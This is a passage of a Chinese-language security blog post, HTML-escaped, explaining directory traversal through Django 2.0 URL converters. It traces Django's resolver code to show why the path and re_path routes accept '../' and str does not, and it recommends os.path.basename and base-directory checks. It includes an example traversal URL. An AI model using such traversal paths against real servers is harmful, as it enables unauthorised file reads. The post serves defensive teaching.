-&lt;p&gt;根据&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/#path-converters&#34;&gt;Django文档&lt;/a&gt;描述，str不匹配&lt;code&gt;/&lt;/code&gt;而path匹配&lt;code&gt;/&lt;/code&gt;，意味着当使用&lt;code&gt;&amp;lt;path:filename&amp;gt;&lt;/code&gt;的时候我们还是可以传进去&lt;code&gt;../&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;测试一下&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;使用&lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;的情况&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KkoFJ&#34; alt=&#34;path&#34; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;使用&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;的情况&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/EQBtS&#34; alt=&#34;str&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到当我们定义url的时候如果使用了&lt;code&gt;&amp;lt;path:filename&amp;gt;&lt;/code&gt;的形式，传入的包含&lt;code&gt;/&lt;/code&gt;的参数会被原样接收，当作完整参数交给路由部分处理，而定义为&lt;code&gt;&amp;lt;str:filename&amp;gt;&lt;/code&gt;(默认即为str)的时候，&lt;code&gt;/&lt;/code&gt;不被后端接收，这时候&lt;code&gt;xx.com/download/../1/1.txt&lt;/code&gt;这种路径下浏览器就根据url往上跳一级，也就是&lt;code&gt;xx.com/1/1.txt&lt;/code&gt;，django收到了的请求也是如此，于是django抛出一个找不到对应页面的异常&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/bZQdj&#34; alt=&#34;404&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Django2.0的url虽然更改了写法，但依然向老版本兼容，兼容的办法就是用&lt;code&gt;re_path()&lt;/code&gt;方法代替&lt;code&gt;path()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;re_path(&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;这个匹配方式和1.8版本中&lt;code&gt;url(r&#39;^download/(.+)$&#39;, &amp;quot;mysite.views.file_download&amp;quot;),&lt;/code&gt;的意思是一样的，只是写法不同&lt;/p&gt;
-
-&lt;p&gt;我们知道任何一种路由写法在经过django的urls模块相关方法处理之后都会转换为正则表达式进行匹配，之所以几种方式匹配结果不一样是因为处理完成后生成的正则不一样，把url路由转换为正则表达式的过程只会在django启动的时候编译一次，接收到的任何url形式都会根据生成的正则来路由到views定义的相关方法，urls模块就不用每次都去处理用户传递的url。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x03-断点分析&#34;&gt;0x03 断点分析&lt;/h3&gt;
-
-&lt;p&gt;我们从代码层面来看一下这几者的区别&lt;/p&gt;
-
-&lt;h5 id=&#34;1-re-path-download-p-filename-方式&#34;&gt;1.&lt;code&gt;re_path(&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;&lt;/code&gt;方式&lt;/h5&gt;
-
-&lt;p&gt;在&lt;code&gt;/Lib/site-packages/django/urls/conf.py&lt;/code&gt;中定义了相关方法&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uPvF8&#34; alt=&#34;re_path()&#34; /&gt;
-&lt;code&gt;partial()&lt;/code&gt;方法的作用就是把一个函数作为另一个函数的参数传入，这里就是把&lt;code&gt;RegexPattern()&lt;/code&gt;类作为参数传进&lt;code&gt;_path()&lt;/code&gt;方法，因为在下面第70行&lt;code&gt;RegexPattern()&lt;/code&gt;就作为处理&lt;code&gt;re_path()&lt;/code&gt;时的方法&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;pattern = Pattern(route, name=name, is_endpoint=True)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;跟入&lt;code&gt;RegexPattern()&lt;/code&gt;类 &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:136&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;构造方法之后regex就确定为我们定义的表达式，也就是&lt;code&gt;&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/4dWIr&#34; alt=&#34;regex&#34; /&gt;
-这种情况下是可以匹配任何字符串的，起不到防护目录穿越的作用&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/cEbp5&#34; alt=&#34;regex&#34; /&gt;&lt;/p&gt;
-
-&lt;h5 id=&#34;2-path-download-path-filename-方式&#34;&gt;2. &lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;&lt;/code&gt;方式&lt;/h5&gt;
-
-&lt;p&gt;同样的，第一步还是进入到&lt;code&gt;/Lib/site-packages/django/urls/conf.py&lt;/code&gt;，处理&lt;code&gt;path()&lt;/code&gt;相关的就交给&lt;code&gt;RoutePattern()&lt;/code&gt;类&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;path = partial(_path, Pattern=RoutePattern)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;跟入&lt;code&gt;RoutePattern()&lt;/code&gt;类  &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:234&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;初始化过程中进行了route转换成regex的操作&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def __init__(self, route, name=None, is_endpoint=False):
-    self._route = route
-    self._regex_dict = {}
-    self._is_endpoint = is_endpoint
-    self.name = name
-    self.converters = _route_to_regex(str(route), is_endpoint)[1]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;跟入&lt;code&gt;_route_to_regex()&lt;/code&gt;方法，&lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:194&lt;/code&gt;，看到该方法描述的功能就是将路径模式转换为正则表达式。&lt;/p&gt;
-
-&lt;p&gt;首先对我们的&amp;rdquo;路由&amp;rdquo;通过&lt;code&gt;_PATH_PARAMETER_COMPONENT_RE()&lt;/code&gt;方法使用正则进行分割，&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;_PATH_PARAMETER_COMPONENT_RE = re.compile(
-    r&#39;&amp;lt;(?:(?P&amp;lt;converter&amp;gt;[^&amp;gt;:]+):)?(?P&amp;lt;parameter&amp;gt;\w+)&amp;gt;&#39;
-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;取出&lt;code&gt;converter&lt;/code&gt;部分，也就是我们指定的&lt;code&gt;path&lt;/code&gt;，然后判断如果&lt;code&gt;converter&lt;/code&gt;为空的话就赋值为&amp;rsquo;str&amp;rsquo;，这也就是为什么我们不指定路径转换器时默认是str的原因。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/2Yr3G&#34; alt=&#34;converter&#34; /&gt;
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/rMvhH&#34; alt=&#34;path&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;接下来对转换器部分的操作&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;try:
-    converter = get_converter(raw_converter)
-except KeyError as e:
-    raise ImproperlyConfigured(
-        &amp;quot;URL route &#39;%s&#39; uses invalid converter %s.&amp;quot; % (original_route, e)
-    )
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;跟入&lt;code&gt;get_converter()&lt;/code&gt;方法，&lt;code&gt;/Lib/site-packages/django/urls/converters.py:69&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;最后调用的是&lt;code&gt;get_converters()&lt;/code&gt;，看到该方法里面定义了一些默认属性，这些属性的值在这个文件上方定义，
-这里我们看到定义了文档中提到的5种路径转换器&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;DEFAULT_CONVERTERS = {
-    &#39;int&#39;: IntConverter(),
-    &#39;path&#39;: PathConverter(),
-    &#39;slug&#39;: SlugConverter(),
-    &#39;str&#39;: StringConverter(),
-    &#39;uuid&#39;: UUIDConverter(),
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;相对应的regex值也就在这里被定义&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/cft5C&#34; alt=&#34;default_regex&#34; /&gt;
-于是在&lt;code&gt;decorating_function()&lt;/code&gt;通过&lt;code&gt;cache_get()&lt;/code&gt;方法取到了这些转换器对应的表达式，最后进行了拼接&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/vUIRy&#34; alt=&#34;Untitled Image&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;通过&lt;code&gt;parts.append&lt;/code&gt;拼接
-&lt;code&gt;parts.append(&#39;(?P&amp;lt;&#39; + parameter + &#39;&amp;gt;&#39; + converter.regex + &#39;)&#39;)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;此时的&amp;rsquo;parameter&amp;rsquo;值即为&amp;rsquo;filename&amp;rsquo;，regex值为converter对象的属性，也就是&lt;code&gt;&#39;.+&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/I6I4E&#34; alt=&#34;regex&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;最后拼接成的正则表达式为&lt;code&gt;&#39;^download\\/(?P&amp;lt;filename&amp;gt;.+)$&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;与我们使用&lt;code&gt;re_path()&lt;/code&gt;时的表达式是一样的，所以也能匹配到&lt;code&gt;../&lt;/code&gt;之类的字符串，依旧起不到防止目录穿越的作用&lt;/p&gt;
-
-&lt;h5 id=&#34;3-path-download-str-filename-方式&#34;&gt;3. &lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;方式&lt;/h5&gt;
-
-&lt;p&gt;接下来看&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;方式，不指定converter时&lt;code&gt;path(&#39;download/&amp;lt;filename&amp;gt;&#39;&lt;/code&gt;默认的就是这种方式&lt;/p&gt;
-
-&lt;p&gt;同样跟入到&lt;code&gt;RoutePattern()&lt;/code&gt;类  &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:234&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;流程跟上面指定&lt;code&gt;path&lt;/code&gt;的方式一样，&lt;code&gt;converter&lt;/code&gt;为空时设置为&amp;rsquo;str&amp;rsquo;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/LKW7J&#34; alt=&#34;str&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;此时对应的regex值为&lt;code&gt;&#39;[^/]+&#39;&lt;/code&gt;，也就是不匹配&lt;code&gt;&#39;/&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/iVQBV&#34; alt=&#34;cache&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/prryr&#34; alt=&#34;converter&#34; /&gt;
-最终拼接成的正则为&lt;code&gt;&#39;^download\\/(?P&amp;lt;filename&amp;gt;[^/]+)$&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;这种情况下由于不匹配&lt;code&gt;/&lt;/code&gt;我们就无法传入&lt;code&gt;../&lt;/code&gt;之类的字符串，也就不能穿越目录&lt;/p&gt;
-
-&lt;h4 id=&#34;流程图&#34;&gt;流程图&lt;/h4&gt;
-
-&lt;p&gt;画了一张简单的流程图方便理解上述三种情况&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/t5Tay&#34; alt=&#34;process&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x04-如何避免-正确的代码&#34;&gt;0x04 如何避免&amp;amp;正确的代码&lt;/h3&gt;
-
-&lt;p&gt;把django处理url的各种情况理清了之后可能有同学会问，是不是以后都用&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;的方式就能避免目录穿越呢？实际上是不建议这样的，我们不能把风险点由存在缺陷的代码处转移到依赖框架上面，主要原因有二&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;我们无法确保每次写url传递规则的时候不出错，特别是项目庞大之后为了兼顾功能而忽略一些安全隐患点；&lt;/li&gt;
-&lt;li&gt;存在缺陷的代码不能就这样放着，因为无法保证在别处不会调用这块代码，必须把风险点从根本上消除。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;回到代码脆弱性本身，如何从根源处消除目录遍历漏洞呢？
-一个想法是限定basedir，并递归过滤任何&lt;code&gt;../&lt;/code&gt;之类的字符串，当然也要考虑经过url encode之后的路径，另一个简单的方法是使用&lt;code&gt;os.path.basename()&lt;/code&gt;方法，这个方法会忽略前面的路径只取到文件名，可以杜绝此类漏洞。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
-
-&lt;p&gt;本文从目录遍历漏洞入手，分析了django框架处理url传递的逻辑，以及如何正确控制风险点避免出现问题代码，遵循的原则就是不要相信用户的输入，严格控制每一个参数。&lt;/p&gt;
-
-&lt;p&gt;感谢阅读，有任何不足之处欢迎指正。&lt;/p&gt;
-
-&lt;p&gt;参考:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/&#34;&gt;https://docs.djangoproject.com/en/2.0/topics/http/urls/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.lijiejie.com/python-django-directory-traversal/&#34;&gt;http://www.lijiejie.com/python-django-directory-traversal/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html&#34;&gt;https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
